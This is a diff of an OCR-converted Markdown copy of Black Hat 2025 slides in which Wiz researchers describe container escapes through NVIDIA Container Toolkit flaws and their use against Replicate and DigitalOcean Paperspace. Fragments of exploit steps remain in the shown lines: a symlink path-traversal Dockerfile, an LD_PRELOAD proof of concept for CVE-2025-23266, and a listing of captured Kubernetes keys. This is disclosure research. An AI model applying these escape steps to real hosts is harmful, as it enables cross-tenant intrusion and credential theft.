@@ -8,13 +8,17 @@ year: 2025
 source_pdf: "BlackHat_USA_2025_Slides/Andres Riancho&Hillai Ben-Sasson&Ronen Shustin_Breaking Out of The AI Cage Pwning AI Providers with NVIDIA Vulnerabilities.pdf"
 pages: 53
 sha256: "e49e2157a9f30987f79632cbe9cdf559f0fb930ab89de86859f678dfc8c2f285"
-text_chars: 11431
-ocr_pages: 16
+text_chars: 10716
+ocr_pages: 14
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 86.2
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T22:49:53Z"
+converted_at: "2026-08-12T05:04:49Z"
 ---
 # Breaking Out of The AI Cage Pwning AI Providers with NVIDIA Vulnerabilities
 
@@ -22,13 +26,15 @@ converted_at: "2026-08-11T22:49:53Z"
 **Conference:** Black Hat USA 2025  
 **Source:** `BlackHat_USA_2025_Slides/Andres Riancho&Hillai Ben-Sasson&Ronen Shustin_Breaking Out of The AI Cage Pwning AI Providers with NVIDIA Vulnerabilities.pdf` (53 pages)
 
+
 ## Slide 1
 
 Hillai Ben-Sasson Andres Riancho
 
 @hillai @AndresRiancho
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 WIZ Research
@@ -151,12 +157,12 @@ GPUs
 
 **GPUs!**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 16S) GPUs!
 NVIDIA Corporation
-co
 Verified
 22 17.7k followers © 2788 San Tomas Expressway, Sant... eC https://nvidia.com
 (i) Overview [) Repositories 583 FA Projects 8 © Packages & People 101
@@ -182,29 +188,26 @@ What is it, and how we hacked it
 
 **NCT 102**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 NCT 102 ©&
 invokes
-a . , executes startContainer hook
 nvidia-container-runtime jue runc
 initializes
-NZ
 © nvidia-container-runtime-hook
-. , modifies
-container
 ```
 
 ## Slide 13
 
 **Interesting mounts**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 72/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Interesting mounts
-ee@
 $ mount
 [...]
 /dev/nvmeOn1ip1 /usr/lib/x86_64-lLinux-gnu/libnvidia-ml.so.570.133.20 type xfs
@@ -218,7 +221,6 @@ $ mount
 /dev/nvmeOnip1 /usr/lib/x86_64-Linux-gnu/libnvidia-pkcs11.s0.570.133.20 type xfs
 /dev/nvmeOn1ip1 /usr/lib/x86_64-linux-gnu/libnvidia-pkcs11l-openssl3.s0.570.133.20 type xfs
 /dev/nvmeOn1ip1 /usr/lib/x86_64-linux-gnu/libnvidia-nvvm.so.570.133.20 type xfs
-[...]
 ```
 
 ## Slide 14
@@ -241,15 +243,14 @@ compat/…
 
 **Bind mounts inside the container**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Bind mounts inside the container
 root@host# cat /var/log/nvidia-container-toolkit. log
 [nvc_mount.c:134] mounting
-/var/lib/docker/overlay2/{1ID}/merged/usr/local/cuda-12.3/compat/libnvidia-nvvm.so.545.23.08
 at
-/var/lib/docker/over lLay2/{1ID}/merged/usr/lib/x86_64-linux-gnu/ lLibnvidia-nvvm.so.545.23.08
 ```
 
 ## Slide 17
@@ -272,13 +273,13 @@ compat/…
 
 **Nope!**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Nope!
 root@host# docker run -it --rm --gpus all wiz-naive bash
 nvidta-container-cli: container error:
-/usr/local/cuda-12.3/compat/lLibnvidia-wiz.so.1
 /var/lib/docker/overlay2/{1ID}/merged
 ```
 
@@ -329,15 +330,6 @@ libnvidia-ml.so.6 libnvidia-ml.so.6
 mount ( )
 libnvidia-ml.so.7
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-(> Jusr/local/cuda/compat/ < [> /usr/lib/x86_64-linux-gnu/
-libnvidia-ml.so.6 libnvidia-ml.so.6
-7
-libnvidia-ml.so.7
-```
-
 ## Slide 25
 
 **/usr/local/cuda/compat/**
@@ -347,15 +339,6 @@ libnvidia-ml.so.7
 /usr/lib/x86_64-linux-gnu/
 
 libnvidia-ml.so.6
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-| lm) /usr/local/cuda/compat/
-lm) /usr/lib/x86_64-linux-gnu/
-libnvidia-ml.so.7
-libnvidia-ml.so.6
-```
 
 ## Slide 26
 
@@ -387,7 +370,8 @@ libnvidia-ml.so.7 ../../../../../../../..
 
 **Final exploit**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Final exploit
@@ -396,7 +380,6 @@ mkdir -p /usr/lib/x86_64-Linux-gnu
 mkdir -p /usr/local/cuda/compat/libnvidia-ml.so.6/
 touch /usr/local/cuda/compat/libnvidia-ml.so.7
 RUN ../../../usr/local/cuda/compat /usr/lib/x86_64-Linux-gnu/libnvidia-ml.so.6
-eeJeeLecLeeleeJeile Joie Js/..J.. f/usr/local/cuda/compat/libnvidia-ml.so.6/libnvidia-ml.so.7
 ```
 
 ## Slide 29
@@ -427,13 +410,12 @@ Case study #1 **Replicate**
 
 **Replicate**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Replicate
-[-
 Popular models
-gy
 bytedance / sdxl-lightning-
 Astep
 SDXL-Lightning by ByteDance: a fast text-
@@ -464,12 +446,12 @@ Updated 2 months, 2 weeks ago 87 13M runs
 
 **What’s a “Cog”?**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 What's a “Cog”?
 cog Public © Watch 68 w
-a
 Cog: Containers for machine learning
 Cog is an open-source tool that lets you package machine learning models in a standard, production-ready
 container.
@@ -482,7 +464,8 @@ You can deploy your packaged model to your own infrastructure, or to Replicate.
 
 **$ cog predict --RCE**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 S$ cog predict --RCE
@@ -509,7 +492,8 @@ Generated in
 
 ## **Hello Redis my old friend**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Hello Redis my old friend
@@ -582,7 +566,8 @@ Case study #2 **DigitalOcean**
 
 **DigitalOcean Paperspace**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 DigitalOcean Paperspace
@@ -613,7 +598,8 @@ deploy!
 
 **We do**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 We do
@@ -628,16 +614,12 @@ Jul
 Jul
 Jul
 Jul
-af
-5 od
 kube-ca.pem
 kube-node-key.pem
 kube-node. pem
 kube-proxy-key.pem
 kube-proxy.pem
 kubecfg-kube-node. yaml
-kubecfg-kube-proxy. yaml
-HRA HH HAHAHAHA
 ```
 
 ## Slide 47
@@ -722,11 +704,11 @@ Let’s sum things up
 
 CVE-2025-23266
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 On the next episode of Wiz Research...
-CVE-2025-23266
 FROM busybox
 ENV LD_PRELOAD=/proc/self/cwd/poc.so
 ADD poc.so /
